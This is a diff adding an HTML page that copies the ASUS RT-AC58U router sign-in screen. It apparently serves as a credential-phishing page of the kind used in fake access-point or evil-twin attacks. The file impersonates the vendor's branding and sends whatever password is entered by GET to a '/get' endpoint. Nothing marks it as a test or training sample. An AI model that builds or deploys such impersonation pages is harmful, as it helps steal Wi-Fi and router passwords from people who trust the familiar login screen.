@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASUS Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1c2126;
+            font-family: "Segoe UI", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+
+        .login-card {
+            background-color: rgba(45, 54, 63, 0.98);
+            width: 380px;
+            padding: 35px;
+            border-radius: 4px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            border: 1px solid #3a4551;
+        }
+
+        .header-box {
+            display: flex;
+            align-items: center;
+            margin-bottom: 2px;
+        }
+
+        .login-icon {
+            width: 26px;
+            height: 26px;
+            margin-right: 12px;
+            fill: #7dbec5;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: normal;
+            margin: 0;
+            color: #7dbec5;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .model-name {
+            font-size: 20px;
+            margin: 8px 0 15px 38px;
+            color: #fff;
+            font-weight: normal;
+        }
+
+        .description {
+            font-size: 13px;
+            color: #a4b1b9;
+            margin: 0 0 25px 38px;
+            line-height: 1.2;
+        }
+
+        .input-group {
+            margin-left: 38px; 
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 15px;
+            background-color: #454f58;
+            border: 1px solid transparent;
+            border-radius: 2px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input:focus {
+            background-color: #4e5963;
+            border-color: #7dbec5;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 10px;
+        }
+
+        button {
+            background-color: #2490d1;
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            font-size: 18px;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background-color: #2ba2eb;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="header-box">
+        <svg class="login-icon" viewBox="0 0 24 24">
+            <path d="M10,17V14H3V10H10V7L15,12L10,17M10,2H19A2,2 0 0,1 21,4V20A2,2 0 0,1 19,22H10A2,2 0 0,1 8,20V18H10V20H19V4H10V6H8V4A2,2 0 0,1 10,2Z" />
+        </svg>
+        <h1>SIGN IN</h1>
+    </div>
+    
+    <div class="model-name">RT-AC58U</div>
+    
+    <div class="description">
+        Please enter your password to sign in
+    </div>
+
+    <form action="/get" method="GET">
+        <div class="input-group">
+            <input type="password" name="password" placeholder="Password" required autofocus>
+        </div>
+        
+        <div class="btn-container">
+            <button type="submit">Sign in</button>
+        </div>
+    </form>
+</div>
+
+</body>
+</html>
